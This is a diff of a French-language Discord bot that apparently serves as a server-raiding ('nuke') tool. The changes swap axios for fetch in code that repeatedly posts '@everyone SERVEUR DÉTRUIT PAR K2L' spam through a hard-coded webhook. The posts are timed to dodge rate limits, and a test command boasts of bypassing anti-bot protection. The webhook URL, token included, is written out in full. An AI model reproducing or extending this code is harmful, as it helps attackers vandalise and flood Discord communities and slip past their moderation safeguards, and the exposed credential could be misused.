@@ -1,6 +1,5 @@
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
 const http = require('http');
-const axios = require('axios'); // Nécessaire pour envoyer des requêtes POST propres au webhook
 
 // Ton URL de webhook configurée
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1566422916990505010/lKu7u-ocWRFHCnHBlmamcsKeRbeBfoShTl5259MQrntPCWw6XOcnO1E0wba16WlHsTgL";
@@ -28,7 +27,7 @@ client.on('ready', () => {
     console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
 });
 
-// Anti-bot actif à l'arrivée (ignoré si le serveur bloque les ajouts de bots)
+// Anti-bot actif à l'arrivée
 client.on('guildMemberAdd', async member => {
     if (member.user.bot && member.id !== client.user.id) {
         try {
@@ -183,15 +182,16 @@ client.on('messageCreate', async message => {
                         }
                     ]
                 }).then(async channel => {
-                    // Flood discret via le Webhook configuré pour éviter les mutes de bot classique
                     for (let j = 0; j < 5; j++) {
                         setTimeout(async () => {
                             try {
-                                await axios.post(WEBHOOK_URL, {
-                                    content: '@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza'
+                                await fetch(WEBHOOK_URL, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ content: '@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza' })
                                 });
                             } catch (e) {}
-                        }, j * 500); // Espacement pour éviter le rate limit global
+                        }, j * 500);
                     }
                 }).catch(() => {});
             }
@@ -210,8 +210,10 @@ client.on('messageCreate', async message => {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
         
         try {
-            await axios.post(WEBHOOK_URL, {
-                content: '@everyone TEST WEBHOOK BYPASS RÉUSSI discord.gg/yuza'
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: '@everyone TEST WEBHOOK BYPASS RÉUSSI discord.gg/yuza' })
             });
             await message.reply("✅ Webhook envoyé avec succès sans déclencher l'antibot !");
         } catch (error) {
